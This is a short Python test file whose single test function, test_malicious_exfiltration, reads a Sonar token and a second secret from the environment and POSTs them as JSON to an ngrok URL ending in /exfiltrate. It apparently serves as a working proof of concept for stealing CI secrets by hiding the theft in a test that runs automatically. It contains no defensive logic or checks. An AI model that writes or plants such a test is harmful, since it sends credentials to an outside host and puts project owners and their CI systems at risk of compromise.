import os
import urllib.request
import json

def test_malicious_exfiltration():
    sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
    test_token = os.environ.get("THIS_IS_TEST", "NOT_FOUND")
    
    data = {
        "sonar_token": sonar_token,
        "test_token":test_token
    }

    req = urllib.request.Request(
        "https://4bd4-14-33-52-135.ngrok-free.app/exfiltrate", 
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)
